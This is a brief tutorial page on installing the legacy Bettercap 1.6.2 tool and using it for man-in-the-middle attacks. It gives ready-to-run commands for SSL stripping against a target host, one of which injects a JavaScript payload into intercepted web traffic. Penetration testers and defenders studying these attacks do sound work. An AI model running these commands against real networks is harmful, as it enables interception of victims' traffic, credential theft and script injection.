---
description: Bettercap 1.6.2 is a tool for Man In The Middle Attack and SSL Strip . You will find a series of practical example commands for running Bettercap 1.6.2 and getting the most of this powerful tool.
---

## Bettercap 1.6.2 Installation

BetterCAP is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network

Bettercap 1.6.2 is legacy tool, but it performs ssl strip much better then Bettercap 2.x

Install Ruby Gem

```bash
apt install -y ruby-full libpcap-dev
gem update --system
gem install bettercap
```

Bettercap 1.6.2 installs the executable to /usr/local/bin/bettercap

Bettercap 2.x installs the executable to /usr/bin/bettercap

Both Bettercap 1.6.2 and 2.x shares the same executable name. In order to privet any collisions we will rename the Bettercap 1.6.2 executable to `bettercap1.6.2`.

```bash
mv /usr/local/bin/bettercap /usr/local/bin/bettercap1.6.2
```

From this point you can run bettercap1.6.2 for `Bettercap 1.6.2` and bettercap for `Bettercap 2.x`

## Bettercap 1.6.2 SSL Strip Examples

**Basic SSL Strip Example**

```bash
bettercap1.6.2 -X -T 192.168.1.104 --proxy
```

**SSL Strip With XSS Example**

```bash
bettercap1.6.2 -X -T 192.168.3.104 --proxy --proxy-module injectjs --js-data "<script>alert('SSL STRIP, Script Injection')</script>"
```

## Dbug

To find that Bettercap installation from ruby gems:

```bash
gem environment
```

the path should be under **GEM PATHP** for example:

```bash
/var/lib/gems/2.7.0/gems/bettercap-1.6.2
```
